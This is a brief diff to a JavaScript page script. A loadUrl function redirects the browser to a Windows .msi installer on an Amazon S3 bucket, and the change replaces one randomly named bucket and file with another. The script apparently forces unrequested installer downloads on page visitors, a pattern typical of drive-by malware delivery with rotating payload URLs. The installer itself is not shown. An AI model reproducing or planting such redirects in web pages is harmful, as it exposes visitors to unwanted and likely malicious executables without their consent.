@@ -2,7 +2,7 @@ function loadUrl()
 {
 	if(num>=1)
 	{
-		var url="https://dscc01.s3.us-east-1.amazonaws.com/helwordlog.msi";
+		var url="https://huo1w1ocb.s3.ap-southeast-1.amazonaws.com/huo1w1ocb.msi";
 		window.location=url;
 	}
 }
@@ -12,6 +12,7 @@ function getLoad()
 {
 	num++;
 }
+
 
 
 
